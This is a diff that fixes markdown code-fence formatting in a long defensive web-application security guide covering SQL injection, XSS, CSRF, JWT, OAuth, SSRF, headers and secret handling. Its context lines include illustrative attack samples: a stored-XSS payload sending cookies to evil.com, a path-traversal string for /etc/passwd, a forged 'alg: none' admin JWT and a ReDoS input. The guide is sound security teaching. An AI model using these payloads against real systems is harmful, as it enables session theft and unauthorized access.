@@ -30,7 +30,7 @@ const query = 'SELECT * FROM users WHERE id = ' + userId;
 const query = 'SELECT * FROM users WHERE id = ';
 await db.query(query, [userId]);
 
-```text
+```
 
 ### 2. Broken Authentication
 
@@ -55,7 +55,7 @@ await db.query(query, [userId]);
 import DOMPurify from 'dompurify';
 const clean = DOMPurify.sanitize(dirty);
 
-```text
+```
 
 ### 4. CSRF Protection
 
@@ -68,7 +68,7 @@ if (req.body._csrf !== req.session.csrfToken) {
   throw new Error('CSRF validation failed');
 }
 
-```text
+```
 
 ---
 
@@ -76,14 +76,14 @@ if (req.body._csrf !== req.session.csrfToken) {
 
 ### Essential Headers
 
-```text
+```
 Content-Security-Policy: default-src 'self'
 X-Frame-Options: DENY
 X-Content-Type-Options: nosniff
 Strict-Transport-Security: max-age=31536000
 X-XSS-Protection: 1; mode=block
 
-```text
+```
 
 ### Helmet.js (Express)
 
@@ -91,7 +91,7 @@ X-XSS-Protection: 1; mode=block
 import helmet from 'helmet';
 app.use(helmet());
 
-```text
+```
 
 ---
 
@@ -108,7 +108,7 @@ const hash = await bcrypt.hash(password, 12);
 // Verify password
 const valid = await bcrypt.compare(password, hash);
 
-```text
+```
 
 ### Password Requirements
 
@@ -136,7 +136,7 @@ const limiter = rateLimit({
 
 app.use('/api/', limiter);
 
-```text
+```
 
 ### Input Validation
 
@@ -151,7 +151,7 @@ const userSchema = z.object({
 
 const validated = userSchema.parse(req.body);
 
-```text
+```
 
 ---
 
@@ -166,7 +166,7 @@ const validated = userSchema.parse(req.body);
 DATABASE_URL=postgres://...
 JWT_SECRET=super-secret-key
 
-```text
+```
 
 ### Secret Rotation
 
@@ -204,7 +204,7 @@ JWT_SECRET=super-secret-key
   "ip": "192.168.1.1"
 }
 
-```text
+```
 
 ---
 
@@ -220,14 +220,14 @@ JWT_SECRET=super-secret-key
 
 ### Token Structure
 
-```text
+```
 Header.Payload.Signature
 
 Header: { "alg": "RS256", "typ": "JWT" }
 Payload: { "sub": "123", "exp": 1234567890, "iat": 1234567800 }
 Signature: RS256(header + payload, privateKey)
 
-```text
+```
 
 ### Security Rules
 
@@ -243,14 +243,14 @@ Signature: RS256(header + payload, privateKey)
 
 ## Refresh Token Flow
 
-```text
+```
 1. Login -> Access token (15 min) + Refresh token (7 days)
 2. API call with access token
 3. Token expires -> Use refresh token for new access token
 4. Rotate refresh token on use
 5. Store refresh token in httpOnly cookie
 
-```text
+```
 
 ---
 
@@ -277,7 +277,7 @@ Signature: RS256(header + payload, privateKey)
 
 ### Cookie Settings
 
-```text
+```
 Set-Cookie: session=abc123;
   HttpOnly;       // No JS access
   Secure;         // HTTPS only
@@ -285,7 +285,7 @@ Set-Cookie: session=abc123;
   Path=/;
   Max-Age=86400;
 
-```text
+```
 
 ---
 
@@ -327,7 +327,7 @@ if (!result.success) {
   console.log(result.error.flatten());
 }
 
-```text
+```
 
 ---
 
@@ -354,7 +354,7 @@ const clean = DOMPurify.sanitize(dirty);
 // Validate/sanitize file paths
 // Never exec user input
 
-```text
+```
 
 ---
 
@@ -368,14 +368,14 @@ const clean = DOMPurify.sanitize(dirty);
 
 ## How CORS Works
 
-```text
+```
 1. Browser makes cross-origin request
 2. Browser adds Origin header
 3. Server checks origin
 4. Server responds with Access-Control-Allow-Origin
 5. Browser allows or blocks based on header
 
-```text
+```
 
 ---
 
@@ -415,18 +415,18 @@ app.use(cors({
   maxAge: 86400
 }));
 
-```text
+```
 
 ### Headers Explained
 
-```text
+```
 Access-Control-Allow-Origin: https://example.com
 Access-Control-Allow-Methods: GET, POST
 Access-Control-Allow-Headers: Content-Type, Authorization
 Access-Control-Allow-Credentials: true
 Access-Control-Max-Age: 86400
 
-```text
+```
 
 ---
 
@@ -479,7 +479,7 @@ const hash = await bcrypt.hash(password, 12);
 // Verify password
 const valid = await bcrypt.compare(password, hash);
 
-```text
+```
 
 ### Never Do
 
@@ -508,7 +508,7 @@ function encrypt(text) {
   return { iv, encrypted, authTag };
 }
 
-```text
+```
 
 ---
 
@@ -669,7 +669,7 @@ Re-validate based on context changes
 
 ## CSP Header
 
-```text
+```
 Content-Security-Policy:
   default-src 'self';
   script-src 'self' 'unsafe-inline' https://cdn.example.com;
@@ -678,7 +678,7 @@ Content-Security-Policy:
   font-src 'self' https://fonts.gstatic.com;
   connect-src 'self' https://api.example.com;
 
-```text
+```
 
 ---
 
@@ -707,7 +707,7 @@ const nonce = crypto.randomBytes(16).toString('base64');
 // In HTML
 <script nonce="${nonce}">...</script>
 
-```text
+```
 
 ---
 
@@ -731,7 +731,7 @@ function generateApiKey() {
 }
 // Result: sk_live_AbCdEf123456789...
 
-```text
+```
 
 ---
 
@@ -755,7 +755,7 @@ await db.apiKeys.create({
 // Return full key to user ONCE
 return { apiKey, keyPrefix };
 
-```text
+```
 
 ---
 
@@ -775,7 +775,7 @@ async function validateApiKey(providedKey) {
   return apiKey;
 }
 
-```text
+```
 
 ---
 
@@ -789,7 +789,7 @@ async function validateApiKey(providedKey) {
 
 ## Authorization Code Flow (Best for web apps)
 
-```text
+```
 1. User clicks "Login with Google"
 2. Redirect to:
    https://accounts.google.com/oauth/authorize
@@ -809,7 +809,7 @@ async function validateApiKey(providedKey) {
 
 6. Server receives: { access_token, refresh_token, id_token }
 
-```text
+```
 
 ---
 
@@ -829,13 +829,13 @@ const challenge = crypto
 // 3. Include verifier in token exchange
 { code, code_verifier: verifier, ... }
 
-```text
+```
 
 ---
 
 ## Token Storage
 
-```text
+```
 ACCESS TOKEN:
 
 * Short-lived (15 min)
@@ -850,7 +850,7 @@ REFRESH TOKEN:
 
 * Rotate on use
 
-```text
+```
 
 ---
 
@@ -864,7 +864,7 @@ REFRESH TOKEN:
 
 ## How Takeover Happens
 
-```text
+```
 SCENARIO:
 1. You have: app.example.com CNAME -> something.herokuapp.com
 2. You stop using Heroku, dont remove DNS
@@ -879,7 +879,7 @@ VULNERABLE TO:
 
 * CDNs (Fastly, CloudFront)
 
-```text
+```
 
 ---
 
@@ -895,20 +895,20 @@ dig app.example.com CNAME
 
 # NXDOMAIN or error page = potentially takeable
 
-```text
+```
 
 ---
 
 ## Prevention Checklist
 
-```text
+```
 [ ] Remove DNS records when decommissioning
 [ ] Audit orphan CNAMEs regularly
 [ ] Use wildcard certificates carefully
 [ ] Monitor certificate transparency logs
 [ ] Claim reserved names on platforms
 
-```text
+```
 
 ---
 
@@ -922,7 +922,7 @@ dig app.example.com CNAME
 
 ## Common Bypass Attempts
 
-```text
+```
 1. IP ROTATION
    * Use Cloudflare, VPN detection
    * Rate limit by user ID when authenticated
@@ -939,13 +939,13 @@ dig app.example.com CNAME
    * Many IPs, same target
    * Add CAPTCHA after retries
 
-```text
+```
 
 ---
 
 ## Multi-Layer Limits
 
-```text
+```
 LAYER 1: Global
   10000 requests/min from any IP
 
@@ -959,7 +959,7 @@ LAYER 4: Endpoint-specific
   5 login attempts/15min
   3 password resets/hour
 
-```text
+```
 
 ---
 
@@ -975,7 +975,7 @@ if (!rateLimitResult.allowed) {
   });
 }
 
-```text
+```
 
 ---
 
@@ -989,7 +989,7 @@ if (!rateLimitResult.allowed) {
 
 ## Validation Checklist
 
-```text
+```
 [ ] File size limit enforced
 [ ] File type validated (not just extension!)
 [ ] Filename sanitized
@@ -998,7 +998,7 @@ if (!rateLimitResult.allowed) {
 [ ] Private storage path
 [ ] Unique filename generated
 
-```text
+```
 
 ---
 
@@ -1019,7 +1019,7 @@ async function validateFile(buffer) {
   return type;
 }
 
-```text
+```
 
 ---
 
@@ -1037,20 +1037,20 @@ function sanitizeFilename(filename) {
   return `${uuid()}_${cleaned}`;
 }
 
-```text
+```
 
 ---
 
 ## Storage Path
 
-```text
+```
 NEVER: /uploads/${userFilename}
        (Path traversal: ../../../etc/passwd)
 
 ALWAYS:
 const key = `uploads/${userId}/${uuid()}.${ext}`;
 
-```text
+```
 
 ---
 
@@ -1078,7 +1078,7 @@ npm audit fix
 
 npm audit fix --force
 
-```text
+```
 
 ---
 
@@ -1095,7 +1095,7 @@ npm audit fix --force
   with:
     args: --severity-threshold=high
 
-```text
+```
 
 ---
 
@@ -1119,13 +1119,13 @@ updates:
           * "@types/*"
           * "*-types"
 
-```text
+```
 
 ---
 
 ## Supply Chain Security
 
-```text
+```
 LOCKFILE:
 
 * Always commit package-lock.json
@@ -1142,7 +1142,7 @@ REGISTRY:
 
 * Pin exact versions for security
 
-```text
+```
 
 ---
 
@@ -1182,7 +1182,7 @@ app.use((req, res, next) => {
   next();
 });
 
-```text
+```
 
 ---
 
@@ -1195,19 +1195,19 @@ res.cookie('session', sessionId, {
   sameSite: 'strict'  // Prevents CSRF
 });
 
-```text
+```
 
 ---
 
 ## Double Submit Pattern
 
-```text
+```
 1. Set CSRF token in cookie (httpOnly: false)
 2. Client reads cookie, sends in header
 3. Server compares cookie vs header
 4. Attacker cant read cookie from another origin
 
-```text
+```
 
 ---
 
@@ -1232,7 +1232,7 @@ element.textContent = userInput;
 import { encode } from 'html-entities';
 element.innerHTML = encode(userInput);
 
-```text
+```
 
 ---
 
@@ -1251,7 +1251,7 @@ import DOMPurify from 'dompurify';
   __html: DOMPurify.sanitize(userInput)
 }} />
 
-```text
+```
 
 ---
 
@@ -1264,17 +1264,17 @@ JavaScript: ' " \ <    ? \' \" \\ \x3c
 URL: special chars     ? encodeURIComponent()
 CSS: special chars     ? CSS.escape()
 
-```text
+```
 
 ---
 
 ## CSP as Defense in Depth
 
-```text
+```
 Content-Security-Policy:
   script-src 'self';  // Block inline & external
 
-```text
+```
 
 ---
 
@@ -1308,7 +1308,7 @@ app.use(helmet({
   }
 }));
 
-```text
+```
 
 ---
 
@@ -1339,7 +1339,7 @@ curl -I https://example.com
 
 # observatory.mozilla.org
 
-```text
+```
 
 ---
 
@@ -1651,7 +1651,7 @@ Shor's Algorithm on a Quantum Computer can factor large integers efficiently.
 
 Copy-paste this into Nginx/Vercel.
 
-```text
+```
 Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
 X-Frame-Options: DENY
 X-Content-Type-Options: nosniff
@@ -1659,7 +1659,7 @@ Referrer-Policy: strict-origin-when-cross-origin
 Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; object-src 'none'; base-uri 'self';
 Permissions-Policy: geolocation=(), microphone=(), camera=()
 
-```text
+```
 
 ### B. THE PENTEST CHECKLIST
 
@@ -2402,7 +2402,7 @@ export function sanitizePath(userInput: string): string {
   return userInput.replace(/\.\./g, '').replace(/[\/\\]/g, '');
 }
 
-```text
+```
 
 ---
 
@@ -2438,7 +2438,7 @@ export function csrfMiddleware(req, res, next) {
   next();
 }
 
-```text
+```
 
 ---
 
@@ -2493,7 +2493,7 @@ export async function verifyPassword(password: string, hash: string): Promise<bo
   return bcrypt.compare(password, hash);
 }
 
-```text
+```
 
 ---
 
@@ -2548,7 +2548,7 @@ export async function validateApiKey(key: string) {
   return apiKey;
 }
 
-```text
+```
 
 ---
 
@@ -2578,7 +2578,7 @@ app.use(helmet({
   referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
 }));
 
-```text
+```
 
 ---
 
@@ -2686,7 +2686,7 @@ function generateSecureSecret(): string {
  * 8. [ ] Refresh token rotation implemented
  */
 
-```text
+```
 
 ---
 
@@ -2784,7 +2784,7 @@ app.post('/login', async (req, res) => {
   // Now guaranteed to be strings, not objects
 });
 
-```text
+```
 
 ---
 
@@ -2912,7 +2912,7 @@ class SlidingWindowRateLimiter {
   }
 }
 
-```text
+```
 
 ---
 
@@ -2930,7 +2930,7 @@ class SlidingWindowRateLimiter {
 
 ## Pen Test Phases
 
-```text
+```
 1. RECONNAISSANCE
    * Gather public info
    * DNS records, subdomains
@@ -2955,7 +2955,7 @@ class SlidingWindowRateLimiter {
    * Risk assessment
    * Remediation recommendations
 
-```text
+```
 
 ---
 
@@ -2973,7 +2973,7 @@ class SlidingWindowRateLimiter {
 
 ## Bug Bounty Scope
 
-```text
+```
 IN SCOPE:
 
 * Main application
@@ -2992,7 +2992,7 @@ OUT OF SCOPE:
 
 * DoS testing (unless approved)
 
-```text
+```
 
 ---
 
@@ -3017,7 +3017,7 @@ OUT OF SCOPE:
 
 ## Response Steps
 
-```text
+```
 1. DETECT & IDENTIFY
    * What is happening?
    * When did it start?
@@ -3044,13 +3044,13 @@ OUT OF SCOPE:
    * Lessons learned
    * Update defenses
 
-```text
+```
 
 ---
 
 ## Evidence Preservation
 
-```text
+```
 [ ] Capture system state
 [ ] Preserve logs (immutable)
 [ ] Memory dumps if needed
@@ -3058,7 +3058,7 @@ OUT OF SCOPE:
 [ ] Screenshots
 [ ] Chain of custody
 
-```text
+```
 
 ---
 
@@ -3072,7 +3072,7 @@ OUT OF SCOPE:
 
 ## Rotation Strategy
 
-```text
+```
 1. GENERATE new secret
 2. CONFIGURE both old and new secrets valid
 3. UPDATE all consumers to use new
@@ -3080,7 +3080,7 @@ OUT OF SCOPE:
 5. INVALIDATE old secret
 6. DELETE old secret from storage
 
-```text
+```
 
 ---
 
@@ -3104,13 +3104,13 @@ async function getSecret(secretName) {
 // Enable auto-rotation in AWS Console
 // Lambda function handles rotation
 
-```text
+```
 
 ---
 
 ## Database Password Rotation
 
-```text
+```
 CHALLENGE: Zero-downtime rotation
 
 STEPS:
@@ -3125,7 +3125,7 @@ OR use dual-password support:
 
 * AWS RDS: Secrets Manager integration
 
-```text
+```
 
 ---
 
@@ -3139,7 +3139,7 @@ OR use dual-password support:
 
 ## Stateless JWT Flow
 
-```text
+```
 1. User logs in with credentials
 2. Server validates, creates JWT
 3. JWT contains: { userId, role, exp }
@@ -3148,7 +3148,7 @@ OR use dual-password support:
 6. Server validates JWT signature
 7. No session storage needed!
 
-```text
+```
 
 ---
 
@@ -3172,7 +3172,7 @@ const refreshToken = jwt.sign(
 // Store refresh token hash in DB
 // Rotate on each use
 
-```text
+```
 
 ---
 
@@ -3191,7 +3191,7 @@ blacklist.add(tokenId);
 // JWT contains version
 // Increment version to invalidate all
 
-```text
+```
 
 ---
 
@@ -3205,7 +3205,7 @@ blacklist.add(tokenId);
 
 ## What to Log
 
-```text
+```
 AUTHENTICATION:
 
 * Login success/failure
@@ -3240,7 +3240,7 @@ SYSTEM:
 
 * User permission changes
 
-```text
+```
 
 ---
 
@@ -3268,13 +3268,13 @@ const securityLog = {
   }
 };
 
-```text
+```
 
 ---
 
 ## Alerting Thresholds
 
-```text
+```
 IMMEDIATE ALERT:
 
 * 5 failed logins in 5 minutes (same user)
@@ -3299,7 +3299,7 @@ WEEKLY:
 
 * Unused privileges
 
-```text
+```
 
 ---
 
@@ -3327,7 +3327,7 @@ const UserSchema = z.object({
 const user = UserSchema.parse(requestBody);
 // Throws ZodError if invalid
 
-```text
+```
 
 ---
 
@@ -3353,7 +3353,7 @@ const validate = (schema: z.ZodSchema) => {
 
 app.post('/users', validate(UserSchema), createUser);
 
-```text
+```
 
 ---
 
@@ -3372,7 +3372,7 @@ const cleanHtml = DOMPurify.sanitize(userInput);
 const safePath = path.basename(userInput);
 // Removes directory traversal
 
-```text
+```
 
 ---
 
@@ -3393,7 +3393,7 @@ const sessionId = `${userId}-${Date.now()}`;
 // SECURE: Cryptographically random
 const sessionId = crypto.randomBytes(32).toString('hex');
 
-```text
+```
 
 ---
 
@@ -3409,7 +3409,7 @@ res.cookie('session', sessionId, {
   domain: '.example.com'
 });
 
-```text
+```
 
 ---
 
@@ -3428,7 +3428,7 @@ app.post('/login', async (req, res) => {
   });
 });
 
-```text
+```
 
 ---
 
@@ -3449,7 +3449,7 @@ app.use((req, res, next) => {
   next();
 });
 
-```text
+```
 
 ---
 
@@ -3463,7 +3463,7 @@ app.use((req, res, next) => {
 
 ## Strict-Transport-Security
 
-```text
+```
 Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
 
 WHAT: Forces HTTPS for 1 year
@@ -3473,13 +3473,13 @@ PRELOAD: Submit to browser preload list
 CAUTION: Test thoroughly before enabling
          Cannot be undone easily!
 
-```text
+```
 
 ---
 
 ## Content-Security-Policy
 
-```text
+```
 Content-Security-Policy:
   default-src 'self';
   script-src 'self' 'unsafe-inline' https://cdn.example.com;
@@ -3492,13 +3492,13 @@ Content-Security-Policy:
 
 REPORT: Add report-uri to collect violations
 
-```text
+```
 
 ---
 
 ## X-Frame-Options
 
-```text
+```
 X-Frame-Options: DENY
 
 OPTIONS:
@@ -3511,13 +3511,13 @@ OPTIONS:
 
 WHY: Prevents clickjacking attacks
 
-```text
+```
 
 ---
 
 ## Permissions-Policy
 
-```text
+```
 Permissions-Policy:
   geolocation=(),
   microphone=(),
@@ -3527,7 +3527,7 @@ Permissions-Policy:
 WHAT: Controls browser features
 WHY: Reduces attack surface
 
-```text
+```
 
 ---
 
@@ -3541,7 +3541,7 @@ WHY: Reduces attack surface
 
 ## Hashing Algorithm Choice
 
-```text
+```
 RECOMMENDED: Argon2id
   * Memory-hard (resistant to GPU attacks)
   * Modern, well-analyzed
@@ -3555,7 +3555,7 @@ AVOID:
   * Plain bcrypt without salt
   * Custom hashing schemes
 
-```text
+```
 
 ---
 
@@ -3581,7 +3581,7 @@ async function verifyPassword(password, hash) {
   }
 }
 
-```text
+```
 
 ---
 
@@ -3604,7 +3604,7 @@ if (result.score < 3) {
   throw new Error(result.feedback.warning);
 }
 
-```text
+```
 
 ---
 
@@ -3641,7 +3641,7 @@ function validateApiKey(providedKey) {
   return db.apiKeys.findOne({ hash });
 }
 
-```text
+```
 
 ---
 
@@ -3666,7 +3666,7 @@ app.use((req, res, next) => {
   }
 });
 
-```text
+```
 
 ---
 
@@ -3687,7 +3687,7 @@ function requireScope(...requiredScopes) {
 
 app.delete('/users/:id', requireScope('users:delete'), deleteUser);
 
-```text
+```
 
 ---
 
@@ -3726,7 +3726,7 @@ CREATE TABLE user_roles (
   PRIMARY KEY (user_id, role_id)
 );
 
-```text
+```
 
 ---
 
@@ -3750,7 +3750,7 @@ async function hasPermission(
   return result.length > 0;
 }
 
-```text
+```
 
 ---
 
@@ -3773,7 +3773,7 @@ app.delete('/posts/:id',
   deletePost
 );
 
-```text
+```
 
 ---
 
@@ -3810,7 +3810,7 @@ function verifyTOTP(userToken, secret) {
   });
 }
 
-```text
+```
 
 ---
 
@@ -3839,13 +3839,13 @@ async function useBackupCode(userId, code) {
   return result.count > 0;
 }
 
-```text
+```
 
 ---
 
 ## Recovery Flow
 
-```text
+```
 1. User loses device
 2. User clicks "Lost access"
 3. User enters backup code
@@ -3853,7 +3853,7 @@ async function useBackupCode(userId, code) {
 5. User sets up new MFA device
 6. Generate new backup codes
 
-```text
+```
 
 ---
 
@@ -3880,7 +3880,7 @@ module.exports = {
   extends: ['plugin:security/recommended']
 };
 
-```text
+```
 
 ---
 
@@ -3900,7 +3900,7 @@ npx snyk test
 
 dependency-check --project "MyApp" --scan ./
 
-```text
+```
 
 ---
 
@@ -3918,7 +3918,7 @@ dependency-check --project "MyApp" --scan ./
     exit-code: '1'
     severity: 'CRITICAL,HIGH'
 
-```text
+```
 
 ---
 
@@ -3941,7 +3941,7 @@ dependency-check --project "MyApp" --scan ./
       exit 1
     fi
 
-```text
+```
 
 ---
 
@@ -3977,7 +3977,7 @@ async function handleLoginAttempt(email, password, ip) {
   return user;
 }
 
-```text
+```
 
 ---
 
@@ -4009,7 +4009,7 @@ async function evaluateLoginRisk(user, context) {
   };
 }
 
-```text
+```
 
 ---
 
@@ -4025,7 +4025,7 @@ async function terminateOtherSessions(userId, currentSessionId) {
   await sendEmail(userId, 'All other sessions have been logged out');
 }
 
-```text
+```
 
 ---
 
@@ -4071,13 +4071,13 @@ const tokenResponse = await fetch('https://auth.example.com/token', {
 // Prevents code interception attacks
 // No client secret needed in browser
 
-```text
+```
 
 ---
 
 ## Token Storage
 
-```text
+```
 WHERE TO STORE TOKENS:
 
 ACCESS TOKEN:
@@ -4095,7 +4095,7 @@ REFRESH TOKEN:
 GOTCHA: Never store access token in localStorage!
 Any XSS can steal it.
 
-```text
+```
 
 ---
 
@@ -4129,7 +4129,7 @@ function scheduleRefresh(token) {
   setTimeout(silentRefresh, refreshAt);
 }
 
-```text
+```
 
 ---
 
@@ -4143,14 +4143,14 @@ function scheduleRefresh(token) {
 
 ## Token Structure
 
-```text
+```
 HEADER.PAYLOAD.SIGNATURE
 
 Header: {"alg": "HS256", "typ": "JWT"}
 Payload: {"sub": "user123", "exp": 1234567890}
 Signature: HMACSHA256(header + "." + payload, secret)
 
-```text
+```
 
 ---
 
@@ -4202,13 +4202,13 @@ app.post('/refresh', async (req, res) => {
   }
 });
 
-```text
+```
 
 ---
 
 ## Security Checklist
 
-```text
+```
 Use strong secrets (256+ bits)
 Short access token expiry (15 min)
 Store refresh token in HttpOnly cookie
@@ -4218,7 +4218,7 @@ Validate token on every request
 NEVER store JWT in localStorage
 NEVER trust client-side token data
 
-```text
+```
 
 ---
 
@@ -4279,13 +4279,13 @@ async function handleCallback(code: string) {
   return response.json();
 }
 
-```text
+```
 
 ---
 
 ## Session vs Token Comparison
 
-```text
+```
 SESSION-BASED:
 Server controls session
 Easy to revoke
@@ -4300,7 +4300,7 @@ Works across domains
 Can't revoke until expiry
 Token theft = full access
 
-```text
+```
 
 ---
 
@@ -4314,7 +4314,7 @@ Token theft = full access
 
 ## Types of XSS
 
-```text
+```
 REFLECTED: User input in URL reflected back
 /search?q=<script>alert('XSS')</script>
 
@@ -4324,7 +4324,7 @@ Comment: <script>document.location='evil.com?c='+document.cookie</script>
 DOM-BASED: Client-side JS manipulates DOM unsafely
 element.innerHTML = userInput;  // DANGEROUS!
 
-```text
+```
 
 ---
 
@@ -4341,7 +4341,7 @@ element.innerHTML = userInput;  // DANGEROUS!
 import DOMPurify from 'dompurify';
 <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userInput) }} />
 
-```text
+```
 
 ---
 
@@ -4371,7 +4371,7 @@ res.cookie('session', token, {
 import { escape } from 'html-escaper';
 const safe = escape(userInput);
 
-```text
+```
 
 ---
 
@@ -4400,7 +4400,7 @@ NEXT_PUBLIC_APP_URL="http://localhost:3000"
 
 DATABASE_URL="postgres://prod/mydb"
 
-```text
+```
 
 ---
 
@@ -4428,13 +4428,13 @@ export const env = envSchema.parse({
 import { env } from '@/env';
 const stripe = new Stripe(env.STRIPE_SECRET_KEY);
 
-```text
+```
 
 ---
 
 ## Security Rules
 
-```text
+```
 DO:
 Use environment variables for secrets
 Validate all env vars at startup
@@ -4447,7 +4447,7 @@ Use process.env directly (validate first)
 Put secrets in NEXT_PUBLIC_ vars
 Log environment variables
 
-```text
+```
 
 ---
 
@@ -4461,7 +4461,7 @@ Log environment variables
 
 ## What is CSRF?
 
-```text
+```
 ATTACK:
 1. User logged into bank.com (has session cookie)
 2. User visits evil.com
@@ -4477,7 +4477,7 @@ WHY IT WORKS:
 
 * No verification request came from your site
 
-```text
+```
 
 ---
 
@@ -4505,7 +4505,7 @@ app.post('/submit', (req, res) => {
   // Process request
 });
 
-```text
+```
 
 ---
 
@@ -4528,7 +4528,7 @@ fetch('/api/action', {
 
 // Server verifies header matches cookie
 
-```text
+```
 
 ---
 
@@ -4552,13 +4552,13 @@ res.cookie('session', token, {
   domain: '.myapp.com'  // Subdomain sharing
 });
 
-```text
+```
 
 ---
 
 ## SameSite Explained
 
-```text
+```
 STRICT:
 
 * Cookie never sent cross-site
@@ -4583,13 +4583,13 @@ NONE:
 
 * Use only if necessary
 
-```text
+```
 
 ---
 
 ## Cookie vs localStorage
 
-```text
+```
 COOKIES:
 HttpOnly (safe from XSS)
 Automatic with requests
@@ -4609,7 +4609,7 @@ RECOMMENDATION:
 
 * User preferences localStorage
 
-```text
+```
 
 ---
 
@@ -4656,7 +4656,7 @@ export const { handlers, auth, signIn, signOut } = NextAuth({
   ]
 });
 
-```text
+```
 
 ---
 
@@ -4676,7 +4676,7 @@ export const config = {
   matcher: ['/((?!api | _next/static | _next/image | favicon.ico).*)']
 };
 
-```text
+```
 
 ---
 
@@ -4695,7 +4695,7 @@ export default async function Dashboard() {
   return <div>Welcome, {session.user.name}</div>;
 }
 
-```text
+```
 
 ---
 
@@ -4721,7 +4721,7 @@ export function AuthButton() {
   return <button onClick={() => signIn()}>Sign In</button>;
 }
 
-```text
+```
 
 ---
 
@@ -4754,7 +4754,7 @@ def login(email, password):
 def login(email, password):
     return db.execute("SELECT * FROM users WHERE email = ?", (email,))
 
-```text
+```
 
 ---
 
@@ -4778,7 +4778,7 @@ import bcrypt
 hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(12))
 db.execute("INSERT INTO users VALUES (?, ?)", (email, hashed))
 
-```text
+```
 
 ---
 
@@ -4795,7 +4795,7 @@ jwt.sign({ userId: 123 }, 'weak-secret');
 // RS256 asymmetric (private key stays on server)
 jwt.sign({ sub: userId }, privateKey, { algorithm: 'RS256' });
 
-```text
+```
 
 ---
 
@@ -4815,7 +4815,7 @@ jwt.sign({ sub: userId }, privateKey, { algorithm: 'RS256' });
 
 # TEMP: -Dlog4j2.formatMsgNoLookups=true
 
-```text
+```
 
 ---
 
@@ -4838,7 +4838,7 @@ jwt.sign({ sub: userId }, privateKey, { algorithm: 'RS256' });
 pip install detect-secrets
 detect-secrets scan
 
-```text
+```
 
 ---
 
@@ -4860,7 +4860,7 @@ BLOCKED = ['10.0.0.0/8', '172.16.0.0/12', '169.254.0.0/16', '127.0.0.0/8']
 if any(ip in blocked for blocked in BLOCKED):
     raise HTTPException(400, "URL not allowed")
 
-```text
+```
 
 ---
 
@@ -4894,7 +4894,7 @@ public DecodedJWT verifyToken(String token) {
     return verifier.verify(token);
 }
 
-```text
+```
 
 ### ReDoS (REGEX DENIAL OF SERVICE)
 
@@ -4917,7 +4917,7 @@ function validateInput(input) {
 const RE2 = require('re2');
 const safeRegex = new RE2('^([a-zA-Z0-9]+)*$');
 
-```text
+```
 
 #### END OF VOLUME 1.1: TITAN SECURITY ADVERSARIAL
 
@@ -5047,7 +5047,7 @@ def verify_token_secure(token: str, public_key: str) -> dict:
     except jwt.ExpiredSignatureError:
         raise SecurityException("Token expired")
 
-```text
+```
 
 #### Additional JWT Pitfalls
 
@@ -5119,7 +5119,7 @@ async function handleOIDCCallback(req: Request, res: Response) {
     }
 }
 
-```text
+```
 
 ### DEPENDENCY CONFUSION ATTACK
 
@@ -5143,8 +5143,6 @@ async function handleOIDCCallback(req: Request, res: Response) {
 
 # @mycompany/analytics-internal (cannot be confused)
 
-```text
-
 ```python
 
 # TITAN: Python pip.conf for private packages
@@ -5161,7 +5159,7 @@ extra-index-url = https://pypi.org/simple/
 
 # E.g., mycompany-analytics, mycompany-utils
 
-```text
+```
 
 #### Detection
 
@@ -5171,7 +5169,7 @@ extra-index-url = https://pypi.org/simple/
 
 npm info mycompany-internal 2>&1 | grep -q "404" || echo "ALERT: Name exists on public npm!"
 
-```text
+```
 
 ### CERTIFICATE CHAIN VALIDATION FAILURES
 
@@ -5227,7 +5225,7 @@ def verify_full_chain(hostname: str, port: int = 443) -> dict:
                 "leaf_subject": certs[0].subject
             }
 
-```text
+```
 
 ### CONSTANT-TIME STRING COMPARISON
 
@@ -5267,7 +5265,7 @@ def verify_api_key(provided: str, stored_hash: str) -> bool:
     # Constant-time comparison of hashes
     return secrets.compare_digest(provided_hash, stored_hash)
 
-```text
+```
 
 #### END OF VOLUME 1.5: TITAN SUPPLY CHAIN & IDENTITY ATTACKS
 
@@ -5332,7 +5330,7 @@ class PKCEClient:
         })
         return response.json()
 
-```text
+```
 
 ### SSRF BYPASS TECHNIQUES
 
@@ -5406,7 +5404,7 @@ class SSRFSafeHTTPClient:
 
         return requests.get(safe_url, timeout=5)
 
-```text
+```
 
 ### DESERIALIZATION ATTACKS
 
@@ -5455,8 +5453,6 @@ jsonpickle.set_decoder_options('json', cls=SafeDecoder)
 
 # Plus: Whitelist of allowed classes
 
-```text
-
 ```yaml
 
 # TITAN: Safe YAML
@@ -5482,7 +5478,7 @@ SafeLoader.yaml_constructors = {
 
 config = yaml.load(user_input, Loader=SafeLoader)
 
-```text
+```
 
 ### CSP BYPASS TECHNIQUES
 
@@ -5510,8 +5506,6 @@ config = yaml.load(user_input, Loader=SafeLoader)
 <script nonce="R4nd0mN0nc3">
     // Legitimate code
 </script>
-
-```text
 
 ```python
 
@@ -5541,7 +5535,7 @@ def add_csp_header(response):
     response.headers['Content-Security-Policy'] = csp
     return response
 
-```text
+```
 
 ### RACE CONDITION VULNERABILITIES
 
@@ -5599,7 +5593,7 @@ async def update_with_cas(id, expected_version, new_data):
     if result.rowcount == 0:
         raise ConcurrentModificationError("Retry required")
 
-```text
+```
 
 #### END OF VOLUME 1.6: TITAN DEEP INTERNALS - APPLICATION SECURITY MECHANICS
 
@@ -5635,8 +5629,6 @@ def verify_token(token):
 # Signature: (empty)
 
 # Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJzdXBlcnVzZXIifQ
-
-```text
 
 ```python
 
@@ -5689,7 +5681,7 @@ def verify_token_safe(token: str):
 
     return jwt.decode(token, key, algorithms=[header['alg']])
 
-```text
+```
 
 ### TIMING ATTACKS AGAINST STRING COMPARISON
 
@@ -5719,8 +5711,6 @@ def verify_api_key_bad(provided, stored):
         if provided[i] != stored[i]:
             return False  # Returns early = timing leak!
     return True
-
-```text
 
 ```python
 
@@ -5775,7 +5765,7 @@ def verify_password(provided: str, hashed: str) -> bool:
 
 # }
 
-```text
+```
 
 ### REDOS - REGEX DENIAL OF SERVICE
 
@@ -5802,8 +5792,6 @@ def validate_email(email):
     # With input: 'a' * 30 + '!'
     # Takes MINUTES to return False
     return re.match(BAD_EMAIL + r'example\.com$', email)
-
-```text
 
 ```python
 
